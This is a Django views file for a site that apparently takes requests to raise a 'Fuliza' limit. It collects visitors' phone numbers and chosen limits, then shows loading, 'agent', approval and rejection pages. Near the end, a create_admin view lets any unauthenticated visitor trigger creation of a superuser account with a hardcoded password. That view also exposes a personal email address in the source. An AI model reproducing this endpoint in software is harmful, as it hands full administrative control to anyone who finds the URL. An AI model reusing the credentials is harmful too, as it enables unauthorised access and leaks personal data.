from django.shortcuts import render, redirect, get_object_or_404
from django.http import JsonResponse, HttpResponse
from django.contrib.auth.models import User
from .models import FulizaRequest


def index(request):
    if request.method == 'POST':
        phone = request.POST.get('phone')
        limit = request.POST.get('limit')

        new_request = FulizaRequest.objects.create(
            phone_number=phone,
            selected_limit=limit
        )

        return render(request, 'loading.html', {
            'request_id': new_request.id
        })

    return render(request, 'index.html')


def agent(request, request_id):
    return render(request, 'agent.html', {'request_id': request_id})


def check_status(request, request_id):
    req = get_object_or_404(FulizaRequest, id=request_id)
    return JsonResponse({'status': req.status})


def success(request, request_id):
    req = get_object_or_404(FulizaRequest, id=request_id)

    if req.status != "approved":
        return redirect('index')

    context = {
        "req": req,
        "name": req.name if req.name else "Customer",
        "limit": req.selected_limit,
    }

    return render(request, 'success.html', context)


def rejected(request, request_id):
    req = get_object_or_404(FulizaRequest, id=request_id)

    if req.status != "rejected":
        return redirect('index')

    context = {
        "req": req,
        "name": req.name if req.name else "Customer",
    }

    return render(request, 'rejected.html', context)


# CREATE ADMIN ACCOUNT
def create_admin(request):
    if not User.objects.filter(username='admin').exists():
        User.objects.create_superuser(
            username='admin',
            email='kevok806@gmail.com',
            password='kevin@12'
        )
        return HttpResponse("Admin created successfully")

    return HttpResponse("Admin already exists")